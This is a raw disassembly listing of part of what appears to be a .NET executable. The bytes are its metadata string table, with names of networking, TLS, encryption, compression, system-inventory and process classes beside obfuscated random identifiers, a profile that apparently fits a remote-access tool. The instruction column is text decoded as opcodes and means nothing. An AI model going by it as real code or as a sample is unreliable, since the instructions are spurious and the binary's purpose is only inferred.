  409002:	00 4e 65             	add    %cl,0x65(%esi)
  409005:	74 77                	je     0x40907e
  409007:	6f                   	outsl  %ds:(%esi),(%dx)
  409008:	72 6b                	jb     0x409075
  40900a:	53                   	push   %ebx
  40900b:	74 72                	je     0x40907f
  40900d:	65 61                	gs popa
  40900f:	6d                   	insl   (%dx),%es:(%edi)
  409010:	00 53 73             	add    %dl,0x73(%ebx)
  409013:	6c                   	insb   (%dx),%es:(%edi)
  409014:	53                   	push   %ebx
  409015:	74 72                	je     0x409089
  409017:	65 61                	gs popa
  409019:	6d                   	insl   (%dx),%es:(%edi)
  40901a:	00 43 72             	add    %al,0x72(%ebx)
  40901d:	79 70                	jns    0x40908f
  40901f:	74 6f                	je     0x409090
  409021:	53                   	push   %ebx
  409022:	74 72                	je     0x409096
  409024:	65 61                	gs popa
  409026:	6d                   	insl   (%dx),%es:(%edi)
  409027:	00 47 5a             	add    %al,0x5a(%edi)
  40902a:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  409031:	6d                   	insl   (%dx),%es:(%edi)
  409032:	00 4d 65             	add    %cl,0x65(%ebp)
  409035:	6d                   	insl   (%dx),%es:(%edi)
  409036:	6f                   	outsl  %ds:(%esi),(%dx)
  409037:	72 79                	jb     0x4090b2
  409039:	53                   	push   %ebx
  40903a:	74 72                	je     0x4090ae
  40903c:	65 61                	gs popa
  40903e:	6d                   	insl   (%dx),%es:(%edi)
  40903f:	00 67 65             	add    %ah,0x65(%edi)
  409042:	74 5f                	je     0x4090a3
  409044:	49                   	dec    %ecx
  409045:	74 65                	je     0x4090ac
  409047:	6d                   	insl   (%dx),%es:(%edi)
  409048:	00 67 65             	add    %ah,0x65(%edi)
  40904b:	74 5f                	je     0x4090ac
  40904d:	49                   	dec    %ecx
  40904e:	73 36                	jae    0x409086
  409050:	34 42                	xor    $0x42,%al
  409052:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  409059:	74 
  40905a:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  409061:	65 6d                	gs insl (%dx),%es:(%edi)
  409063:	00 53 79             	add    %dl,0x79(%ebx)
  409066:	6d                   	insl   (%dx),%es:(%edi)
  409067:	6d                   	insl   (%dx),%es:(%edi)
  409068:	65 74 72             	gs je  0x4090dd
  40906b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409072:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  409079:	79 
  40907a:	6d                   	insl   (%dx),%es:(%edi)
  40907b:	6d                   	insl   (%dx),%es:(%edi)
  40907c:	65 74 72             	gs je  0x4090f1
  40907f:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  409086:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40908d:	73 
  40908e:	68 41 6c 67 6f       	push   $0x6f676c41
  409093:	72 69                	jb     0x4090fe
  409095:	74 68                	je     0x4090ff
  409097:	6d                   	insl   (%dx),%es:(%edi)
  409098:	00 78 76             	add    %bh,0x76(%eax)
  40909b:	4d                   	dec    %ebp
  40909c:	4d                   	dec    %ebp
  40909d:	53                   	push   %ebx
  40909e:	51                   	push   %ecx
  40909f:	47                   	inc    %edi
  4090a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4090a1:	69 6d 00 54 72 69 6d 	imul   $0x6d697254,0x0(%ebp),%ebp
  4090a8:	00 46 61             	add    %al,0x61(%esi)
  4090ab:	49                   	dec    %ecx
  4090ac:	68 64 6c 55 4f       	push   $0x4f556c64
  4090b1:	61                   	popa
  4090b2:	67 6b 76 6e 6e       	imul   $0x6e,0x6e(%bp),%esi
  4090b7:	6d                   	insl   (%dx),%es:(%edi)
  4090b8:	00 52 61             	add    %dl,0x61(%edx)
  4090bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4090bc:	64 6f                	outsl  %fs:(%esi),(%dx)
  4090be:	6d                   	insl   (%dx),%es:(%edi)
  4090bf:	00 49 43             	add    %cl,0x43(%ecx)
  4090c2:	72 79                	jb     0x40913d
  4090c4:	70 74                	jo     0x40913a
  4090c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c7:	54                   	push   %esp
  4090c8:	72 61                	jb     0x40912b
  4090ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4090cb:	73 66                	jae    0x409133
  4090cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4090ce:	72 6d                	jb     0x40913d
  4090d0:	00 45 6e             	add    %al,0x6e(%ebp)
  4090d3:	75 6d                	jne    0x409142
  4090d5:	00 45 52             	add    %al,0x52(%ebp)
  4090d8:	53                   	push   %ebx
  4090d9:	61                   	popa
  4090da:	4b                   	dec    %ebx
  4090db:	4f                   	dec    %edi
  4090dc:	61                   	popa
  4090dd:	51                   	push   %ecx
  4090de:	4b                   	dec    %ebx
  4090df:	79 6d                	jns    0x40914e
  4090e1:	00 58 4e             	add    %bl,0x4e(%eax)
  4090e4:	53                   	push   %ebx
  4090e5:	61                   	popa
  4090e6:	41                   	inc    %ecx
  4090e7:	48                   	dec    %eax
  4090e8:	4e                   	dec    %esi
  4090e9:	4a                   	dec    %edx
  4090ea:	41                   	inc    %ecx
  4090eb:	52                   	push   %edx
  4090ec:	5a                   	pop    %edx
  4090ed:	7a 6d                	jp     0x40915c
  4090ef:	00 72 51             	add    %dh,0x51(%edx)
  4090f2:	4e                   	dec    %esi
  4090f3:	6b 59 55 43          	imul   $0x43,0x55(%ecx),%ebx
  4090f7:	69 4b 71 67 7a 6d 00 	imul   $0x6d7a67,0x71(%ebx),%ecx
  4090fe:	49                   	dec    %ecx
  4090ff:	55                   	push   %ebp
  409100:	6c                   	insb   (%dx),%es:(%edi)
  409101:	52                   	push   %edx
  409102:	6d                   	insl   (%dx),%es:(%edi)
  409103:	52                   	push   %edx
  409104:	62 70 56             	bound  %esi,0x56(%eax)
  409107:	58                   	pop    %eax
  409108:	43                   	inc    %ebx
  409109:	43                   	inc    %ebx
  40910a:	6e                   	outsb  %ds:(%esi),(%dx)
  40910b:	00 42 57             	add    %al,0x57(%edx)
  40910e:	72 77                	jb     0x409187
  409110:	54                   	push   %esp
  409111:	76 76                	jbe    0x409189
  409113:	51                   	push   %ecx
  409114:	65 45                	gs inc %ebp
  409116:	58                   	pop    %eax
  409117:	73 51                	jae    0x40916a
  409119:	6e                   	outsb  %ds:(%esi),(%dx)
  40911a:	00 78 69             	add    %bh,0x69(%eax)
  40911d:	6e                   	outsb  %ds:(%esi),(%dx)
  40911e:	55                   	push   %ebp
  40911f:	77 71                	ja     0x409192
  409121:	78 5a                	js     0x40917d
  409123:	54                   	push   %esp
  409124:	61                   	popa
  409125:	49                   	dec    %ecx
  409126:	46                   	inc    %esi
  409127:	52                   	push   %edx
  409128:	6e                   	outsb  %ds:(%esi),(%dx)
  409129:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40912d:	6f                   	outsl  %ds:(%esi),(%dx)
  40912e:	6f                   	outsl  %ds:(%esi),(%dx)
  40912f:	6c                   	insb   (%dx),%es:(%edi)
  409130:	65 61                	gs popa
  409132:	6e                   	outsb  %ds:(%esi),(%dx)
  409133:	00 4d 61             	add    %cl,0x61(%ebp)
  409136:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  40913d:	43                   	inc    %ebx
  40913e:	68 61 69 6e 00       	push   $0x6e6961
  409143:	41                   	inc    %ecx
  409144:	70 70                	jo     0x4091b6
  409146:	44                   	inc    %esp
  409147:	6f                   	outsl  %ds:(%esi),(%dx)
  409148:	6d                   	insl   (%dx),%es:(%edi)
  409149:	61                   	popa
  40914a:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  409151:	43                   	inc    %ebx
  409152:	75 72                	jne    0x4091c6
  409154:	72 65                	jb     0x4091bb
  409156:	6e                   	outsb  %ds:(%esi),(%dx)
  409157:	74 44                	je     0x40919d
  409159:	6f                   	outsl  %ds:(%esi),(%dx)
  40915a:	6d                   	insl   (%dx),%es:(%edi)
  40915b:	61                   	popa
  40915c:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  409163:	00 47 65             	add    %al,0x65(%edi)
  409166:	74 46                	je     0x4091ae
  409168:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40916f:	57 
  409170:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  409177:	78 
  409178:	74 65                	je     0x4091df
  40917a:	6e                   	outsb  %ds:(%esi),(%dx)
  40917b:	73 69                	jae    0x4091e6
  40917d:	6f                   	outsl  %ds:(%esi),(%dx)
  40917e:	6e                   	outsb  %ds:(%esi),(%dx)
  40917f:	00 67 65             	add    %ah,0x65(%edi)
  409182:	74 5f                	je     0x4091e3
  409184:	4f                   	dec    %edi
  409185:	53                   	push   %ebx
  409186:	56                   	push   %esi
  409187:	65 72 73             	gs jb  0x4091fd
  40918a:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  409191:	74 65                	je     0x4091f8
  409193:	6d                   	insl   (%dx),%es:(%edi)
  409194:	2e 49                	cs dec %ecx
  409196:	4f                   	dec    %edi
  409197:	2e 43                	cs inc %ebx
  409199:	6f                   	outsl  %ds:(%esi),(%dx)
  40919a:	6d                   	insl   (%dx),%es:(%edi)
  40919b:	70 72                	jo     0x40920f
  40919d:	65 73 73             	gs jae 0x409213
  4091a0:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  4091a7:	6c                   	insb   (%dx),%es:(%edi)
  4091a8:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4091af:	00 53 79             	add    %dl,0x79(%ebx)
  4091b2:	73 74                	jae    0x409228
  4091b4:	65 6d                	gs insl (%dx),%es:(%edi)
  4091b6:	2e 53                	cs push %ebx
  4091b8:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4091bc:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  4091c3:	68 
  4091c4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4091c6:	74 69                	je     0x409231
  4091c8:	63 61 74             	arpl   %esp,0x74(%ecx)
  4091cb:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  4091d2:	74 65                	je     0x409239
  4091d4:	6d                   	insl   (%dx),%es:(%edi)
  4091d5:	2e 52                	cs push %edx
  4091d7:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4091da:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091df:	6e                   	outsb  %ds:(%esi),(%dx)
  4091e0:	00 58 35             	add    %bl,0x35(%eax)
  4091e3:	30 39                	xor    %bh,(%ecx)
  4091e5:	43                   	inc    %ebx
  4091e6:	65 72 74             	gs jb  0x40925d
  4091e9:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4091f0:	43                   	inc    %ebx
  4091f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4091f2:	6c                   	insb   (%dx),%es:(%edi)
  4091f3:	6c                   	insb   (%dx),%es:(%edi)
  4091f4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fa:	00 4d 61             	add    %cl,0x61(%ebp)
  4091fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fe:	61                   	popa
  4091ff:	67 65 6d             	gs insl (%dx),%es:(%di)
  409202:	65 6e                	outsb  %gs:(%esi),(%dx)
  409204:	74 4f                	je     0x409255
  409206:	62 6a 65             	bound  %ebp,0x65(%edx)
  409209:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40920d:	6c                   	insb   (%dx),%es:(%edi)
  40920e:	6c                   	insb   (%dx),%es:(%edi)
  40920f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409214:	6e                   	outsb  %ds:(%esi),(%dx)
  409215:	00 73 65             	add    %dh,0x65(%ebx)
  409218:	74 5f                	je     0x409279
  40921a:	50                   	push   %eax
  40921b:	6f                   	outsl  %ds:(%esi),(%dx)
  40921c:	73 69                	jae    0x409287
  40921e:	74 69                	je     0x409289
  409220:	6f                   	outsl  %ds:(%esi),(%dx)
  409221:	6e                   	outsb  %ds:(%esi),(%dx)
  409222:	00 43 72             	add    %al,0x72(%ebx)
  409225:	79 70                	jns    0x409297
  409227:	74 6f                	je     0x409298
  409229:	67 72 61             	addr16 jb 0x40928d
  40922c:	70 68                	jo     0x409296
  40922e:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  409235:	74 69                	je     0x4092a0
  409237:	6f                   	outsl  %ds:(%esi),(%dx)
  409238:	6e                   	outsb  %ds:(%esi),(%dx)
  409239:	00 41 72             	add    %al,0x72(%ecx)
  40923c:	67 75 6d             	addr16 jne 0x4092ac
  40923f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409241:	74 4e                	je     0x409291
  409243:	75 6c                	jne    0x4092b1
  409245:	6c                   	insb   (%dx),%es:(%edi)
  409246:	45                   	inc    %ebp
  409247:	78 63                	js     0x4092ac
  409249:	65 70 74             	gs jo  0x4092c0
  40924c:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  409253:	75 6d                	jne    0x4092c2
  409255:	65 6e                	outsb  %gs:(%esi),(%dx)
  409257:	74 45                	je     0x40929e
  409259:	78 63                	js     0x4092be
  40925b:	65 70 74             	gs jo  0x4092d2
  40925e:	69 6f 6e 00 45 4d 54 	imul   $0x544d4500,0x6e(%edi),%ebp
  409265:	47                   	inc    %edi
  409266:	74 4e                	je     0x4092b6
  409268:	4c                   	dec    %esp
  409269:	75 73                	jne    0x4092de
  40926b:	76 6f                	jbe    0x4092dc
  40926d:	57                   	push   %edi
  40926e:	6f                   	outsl  %ds:(%esi),(%dx)
  40926f:	00 5a 42             	add    %bl,0x42(%edx)
  409272:	68 79 61 77 65       	push   $0x65776179
  409277:	4e                   	dec    %esi
  409278:	62 4d 62             	bound  %ecx,0x62(%ebp)
  40927b:	6f                   	outsl  %ds:(%esi),(%dx)
  40927c:	00 49 6d             	add    %cl,0x6d(%ecx)
  40927f:	61                   	popa
  409280:	67 65 43             	addr16 gs inc %ebx
  409283:	6f                   	outsl  %ds:(%esi),(%dx)
  409284:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  409289:	66 6f                	outsw  %ds:(%esi),(%dx)
  40928b:	00 46 69             	add    %al,0x69(%esi)
  40928e:	6c                   	insb   (%dx),%es:(%edi)
  40928f:	65 49                	gs dec %ecx
  409291:	6e                   	outsb  %ds:(%esi),(%dx)
  409292:	66 6f                	outsw  %ds:(%esi),(%dx)
  409294:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  409298:	76 65                	jbe    0x4092ff
  40929a:	49                   	dec    %ecx
  40929b:	6e                   	outsb  %ds:(%esi),(%dx)
  40929c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40929e:	00 46 69             	add    %al,0x69(%esi)
  4092a1:	6c                   	insb   (%dx),%es:(%edi)
  4092a2:	65 53                	gs push %ebx
  4092a4:	79 73                	jns    0x409319
  4092a6:	74 65                	je     0x40930d
  4092a8:	6d                   	insl   (%dx),%es:(%edi)
  4092a9:	49                   	dec    %ecx
  4092aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ab:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092ad:	00 43 6f             	add    %al,0x6f(%ebx)
  4092b0:	6d                   	insl   (%dx),%es:(%edi)
  4092b1:	70 75                	jo     0x409328
  4092b3:	74 65                	je     0x40931a
  4092b5:	72 49                	jb     0x409300
  4092b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b8:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092ba:	00 43 53             	add    %al,0x53(%ebx)
  4092bd:	68 61 72 70 41       	push   $0x41707261
  4092c2:	72 67                	jb     0x40932b
  4092c4:	75 6d                	jne    0x409333
  4092c6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092c8:	74 49                	je     0x409313
  4092ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4092cb:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092cd:	00 50 72             	add    %dl,0x72(%eax)
  4092d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4092d1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4092d4:	73 53                	jae    0x409329
  4092d6:	74 61                	je     0x409339
  4092d8:	72 74                	jb     0x40934e
  4092da:	49                   	dec    %ecx
  4092db:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dc:	66 6f                	outsw  %ds:(%esi),(%dx)
  4092de:	00 48 50             	add    %cl,0x50(%eax)
  4092e1:	54                   	push   %esp
  4092e2:	4a                   	dec    %edx
  4092e3:	79 50                	jns    0x409335
  4092e5:	44                   	inc    %esp
  4092e6:	67 47                	addr16 inc %edi
  4092e8:	59                   	pop    %ecx
  4092e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4092ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4092eb:	00 6a 77             	add    %ch,0x77(%edx)
  4092ee:	74 65                	je     0x409355
  4092f0:	4d                   	dec    %ebp
  4092f1:	68 44 67 43 77       	push   $0x77436744
  4092f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f7:	00 55 7a             	add    %dl,0x7a(%ebp)
  4092fa:	75 4c                	jne    0x409348
  4092fc:	79 45                	jns    0x409343
  4092fe:	56                   	push   %esi
  4092ff:	78 57                	js     0x409358
  409301:	54                   	push   %esp
  409302:	47                   	inc    %edi
  409303:	70 00                	jo     0x409305
  409305:	6f                   	outsl  %ds:(%esi),(%dx)
  409306:	72 49                	jb     0x409351
  409308:	53                   	push   %ebx
  409309:	65 48                	gs dec %eax
  40930b:	7a 74                	jp     0x409381
  40930d:	64 4a                	fs dec %edx
  40930f:	6e                   	outsb  %ds:(%esi),(%dx)
  409310:	59                   	pop    %ecx
  409311:	70 00                	jo     0x409313
  409313:	53                   	push   %ebx
  409314:	6c                   	insb   (%dx),%es:(%edi)
  409315:	65 65 70 00          	gs gs jo 0x409319
  409319:	4c                   	dec    %esp
  40931a:	6b 75 50 77          	imul   $0x77,0x50(%ebp),%esi
  40931e:	70 62                	jo     0x409382
  409320:	73 65                	jae    0x409387
  409322:	48                   	dec    %eax
  409323:	4e                   	dec    %esi
  409324:	6c                   	insb   (%dx),%es:(%edi)
  409325:	70 00                	jo     0x409327
  409327:	6b 5a 79 41          	imul   $0x41,0x79(%edx),%ebx
  40932b:	42                   	inc    %edx
  40932c:	73 5a                	jae    0x409388
  40932e:	54                   	push   %esp
  40932f:	51                   	push   %ecx
  409330:	47                   	inc    %edi
  409331:	6f                   	outsl  %ds:(%esi),(%dx)
  409332:	70 00                	jo     0x409334
  409334:	4d                   	dec    %ebp
  409335:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40933c:	74 2e                	je     0x40936c
  40933e:	43                   	inc    %ebx
  40933f:	53                   	push   %ebx
  409340:	68 61 72 70 00       	push   $0x707261
  409345:	48                   	dec    %eax
  409346:	53                   	push   %ebx
  409347:	56                   	push   %esi
  409348:	6c                   	insb   (%dx),%es:(%edi)
  409349:	46                   	inc    %esi
  40934a:	61                   	popa
  40934b:	65 4f                	gs dec %edi
  40934d:	68 4d 74 77 70       	push   $0x7077744d
  409352:	00 4c 41 4b          	add    %cl,0x4b(%ecx,%eax,2)
  409356:	6f                   	outsl  %ds:(%esi),(%dx)
  409357:	47                   	inc    %edi
  409358:	57                   	push   %edi
  409359:	73 63                	jae    0x4093be
  40935b:	47                   	inc    %edi
  40935c:	56                   	push   %esi
  40935d:	77 49                	ja     0x4093a8
  40935f:	46                   	inc    %esi
  409360:	71 00                	jno    0x409362
  409362:	5a                   	pop    %edx
  409363:	4a                   	dec    %edx
  409364:	70 71                	jo     0x4093d7
  409366:	4a                   	dec    %edx
  409367:	7a 6f                	jp     0x4093d8
  409369:	57                   	push   %edi
  40936a:	5a                   	pop    %edx
  40936b:	4b                   	dec    %ebx
  40936c:	4a                   	dec    %edx
  40936d:	6e                   	outsb  %ds:(%esi),(%dx)
  40936e:	4d                   	dec    %ebp
  40936f:	71 00                	jno    0x409371
  409371:	70 51                	jo     0x4093c4
  409373:	77 51                	ja     0x4093c6
  409375:	63 43 44             	arpl   %eax,0x44(%ebx)
  409378:	56                   	push   %esi
  409379:	55                   	push   %ebp
  40937a:	63 76 54             	arpl   %esi,0x54(%esi)
  40937d:	76 51                	jbe    0x4093d0
  40937f:	55                   	push   %ebp
  409380:	71 00                	jno    0x409382
  409382:	6e                   	outsb  %ds:(%esi),(%dx)
  409383:	5a                   	pop    %edx
  409384:	69 79 64 66 41 41 75 	imul   $0x75414166,0x64(%ecx),%edi
  40938b:	6d                   	insl   (%dx),%es:(%edi)
  40938c:	5a                   	pop    %edx
  40938d:	71 00                	jno    0x40938f
  40938f:	6c                   	insb   (%dx),%es:(%edi)
  409390:	64 48                	fs dec %eax
  409392:	41                   	inc    %ecx
  409393:	6f                   	outsl  %ds:(%esi),(%dx)
  409394:	70 58                	jo     0x4093ee
  409396:	52                   	push   %edx
  409397:	4d                   	dec    %ebp
  409398:	55                   	push   %ebp
  409399:	44                   	inc    %esp
  40939a:	6a 73                	push   $0x73
  40939c:	64 71 00             	fs jno 0x40939f
  40939f:	61                   	popa
  4093a0:	42                   	inc    %edx
  4093a1:	52                   	push   %edx
  4093a2:	68 57 74 70 78       	push   $0x78707457
  4093a7:	67 65 71 00          	addr16 gs jno 0x4093ab
  4093ab:	44                   	inc    %esp
  4093ac:	62 6a 77             	bound  %ebp,0x77(%edx)
  4093af:	6f                   	outsl  %ds:(%esi),(%dx)
  4093b0:	71 6b                	jno    0x40941d
  4093b2:	42                   	inc    %edx
  4093b3:	6a 69                	push   $0x69
  4093b5:	71 00                	jno    0x4093b7
  4093b7:	4b                   	dec    %ebx
  4093b8:	4e                   	dec    %esi
  4093b9:	4d                   	dec    %ebp
  4093ba:	46                   	inc    %esi
  4093bb:	58                   	pop    %eax
  4093bc:	48                   	dec    %eax
  4093bd:	72 77                	jb     0x409436
  4093bf:	4f                   	dec    %edi
  4093c0:	59                   	pop    %ecx
  4093c1:	69 6a 71 00 53 79 73 	imul   $0x73795300,0x71(%edx),%ebp
  4093c8:	74 65                	je     0x40942f
  4093ca:	6d                   	insl   (%dx),%es:(%edi)
  4093cb:	2e 4c                	cs dec %esp
  4093cd:	69 6e 71 00 70 69 61 	imul   $0x61697000,0x71(%esi),%ebp
  4093d4:	78 41                	js     0x409417
  4093d6:	69 5a 52 6e 55 57 73 	imul   $0x7357556e,0x52(%edx),%ebx
  4093dd:	71 00                	jno    0x4093df
  4093df:	63 6e 5a             	arpl   %ebp,0x5a(%esi)
  4093e2:	4c                   	dec    %esp
  4093e3:	4a                   	dec    %edx
  4093e4:	45                   	inc    %ebp
  4093e5:	72 73                	jb     0x40945a
  4093e7:	4b                   	dec    %ebx
  4093e8:	44                   	inc    %esp
  4093e9:	72 00                	jb     0x4093eb
  4093eb:	54                   	push   %esp
  4093ec:	74 41                	je     0x40942f
  4093ee:	65 4d                	gs dec %ebp
  4093f0:	6d                   	insl   (%dx),%es:(%edi)
  4093f1:	41                   	inc    %ecx
  4093f2:	62 47 6c             	bound  %eax,0x6c(%edi)
  4093f5:	44                   	inc    %esp
  4093f6:	72 00                	jb     0x4093f8
  4093f8:	53                   	push   %ebx
  4093f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fa:	47                   	inc    %edi
  4093fb:	70 4f                	jo     0x40944c
  4093fd:	49                   	dec    %ecx
  4093fe:	64 6a 4c             	fs push $0x4c
  409401:	6d                   	insl   (%dx),%es:(%edi)
  409402:	42                   	inc    %edx
  409403:	5a                   	pop    %edx
  409404:	4c                   	dec    %esp
  409405:	72 00                	jb     0x409407
  409407:	4c                   	dec    %esp
  409408:	4d                   	dec    %ebp
  409409:	58                   	pop    %eax
  40940a:	46                   	inc    %esi
  40940b:	68 71 58 4d 48       	push   $0x484d5871
  409410:	77 74                	ja     0x409486
  409412:	48                   	dec    %eax
  409413:	65 6c                	gs insb (%dx),%es:(%edi)
  409415:	53                   	push   %ebx
  409416:	72 00                	jb     0x409418
  409418:	66 79 73             	data16 jns 0x40948e
  40941b:	73 6f                	jae    0x40948c
  40941d:	54                   	push   %esp
  40941e:	6f                   	outsl  %ds:(%esi),(%dx)
  40941f:	68 42 58 72 00       	push   $0x725842
  409424:	45                   	inc    %ebp
  409425:	76 55                	jbe    0x40947c
  409427:	4a                   	dec    %edx
  409428:	49                   	dec    %ecx
  409429:	77 6f                	ja     0x40949a
  40942b:	42                   	inc    %edx
  40942c:	6b 48 4c 5a          	imul   $0x5a,0x4c(%eax),%ecx
  409430:	4e                   	dec    %esi
  409431:	59                   	pop    %ecx
  409432:	72 00                	jb     0x409434
  409434:	43                   	inc    %ebx
  409435:	6c                   	insb   (%dx),%es:(%edi)
  409436:	65 61                	gs popa
  409438:	72 00                	jb     0x40943a
  40943a:	43                   	inc    %ebx
  40943b:	68 61 72 00 59       	push   $0x59007261
  409440:	62 46 71             	bound  %eax,0x71(%esi)
  409443:	79 72                	jns    0x4094b7
  409445:	6e                   	outsb  %ds:(%esi),(%dx)
  409446:	74 61                	je     0x4094a9
  409448:	59                   	pop    %ecx
  409449:	5a                   	pop    %edx
  40944a:	42                   	inc    %edx
  40944b:	64 72 00             	fs jb  0x40944e
  40944e:	49                   	dec    %ecx
  40944f:	6e                   	outsb  %ds:(%esi),(%dx)
  409450:	76 6f                	jbe    0x4094c1
  409452:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  409456:	6d                   	insl   (%dx),%es:(%edi)
  409457:	62 65 72             	bound  %esp,0x72(%ebp)
  40945a:	00 4d 44             	add    %cl,0x44(%ebp)
  40945d:	35 43 72 79 70       	xor    $0x70797243,%eax
  409462:	74 6f                	je     0x4094d3
  409464:	53                   	push   %ebx
  409465:	65 72 76             	gs jb  0x4094de
  409468:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40946f:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  409476:	41 
  409477:	43                   	inc    %ebx
  409478:	72 79                	jb     0x4094f3
  40947a:	70 74                	jo     0x4094f0
  40947c:	6f                   	outsl  %ds:(%esi),(%dx)
  40947d:	53                   	push   %ebx
  40947e:	65 72 76             	gs jb  0x4094f7
  409481:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409488:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  40948f:	73 
  409490:	43                   	inc    %ebx
  409491:	72 79                	jb     0x40950c
  409493:	70 74                	jo     0x409509
  409495:	6f                   	outsl  %ds:(%esi),(%dx)
  409496:	53                   	push   %ebx
  409497:	65 72 76             	gs jb  0x409510
  40949a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094a1:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094a8:	72 
  4094a9:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094b0:	64 65 72 00          	fs gs jb 0x4094b4
  4094b4:	4d                   	dec    %ebp
  4094b5:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094bc:	74 2e                	je     0x4094ec
  4094be:	43                   	inc    %ebx
  4094bf:	53                   	push   %ebx
  4094c0:	68 61 72 70 2e       	push   $0x2e707261
  4094c5:	52                   	push   %edx
  4094c6:	75 6e                	jne    0x409536
  4094c8:	74 69                	je     0x409533
  4094ca:	6d                   	insl   (%dx),%es:(%edi)
  4094cb:	65 42                	gs inc %edx
  4094cd:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4094d4:	61                   	popa
  4094d5:	6c                   	insb   (%dx),%es:(%edi)
  4094d6:	6c                   	insb   (%dx),%es:(%edi)
  4094d7:	53                   	push   %ebx
  4094d8:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4094df:	65 
  4094e0:	72 00                	jb     0x4094e2
  4094e2:	67 65 74 5f          	addr16 gs je 0x409545
  4094e6:	42                   	inc    %edx
  4094e7:	75 66                	jne    0x40954f
  4094e9:	66 65 72 00          	data16 gs jb 0x4094ed
  4094ed:	73 65                	jae    0x409554
  4094ef:	74 5f                	je     0x409550
  4094f1:	42                   	inc    %edx
  4094f2:	75 66                	jne    0x40955a
  4094f4:	66 65 72 00          	data16 gs jb 0x4094f8
  4094f8:	67 65 74 5f          	addr16 gs je 0x40955b
  4094fc:	41                   	inc    %ecx
  4094fd:	73 49                	jae    0x409548
  4094ff:	6e                   	outsb  %ds:(%esi),(%dx)
  409500:	74 65                	je     0x409567
  409502:	67 65 72 00          	addr16 gs jb 0x409506
  409506:	73 65                	jae    0x40956d
  409508:	74 5f                	je     0x409569
  40950a:	41                   	inc    %ecx
  40950b:	73 49                	jae    0x409556
  40950d:	6e                   	outsb  %ds:(%esi),(%dx)
  40950e:	74 65                	je     0x409575
  409510:	67 65 72 00          	addr16 gs jb 0x409514
  409514:	4d                   	dec    %ebp
  409515:	61                   	popa
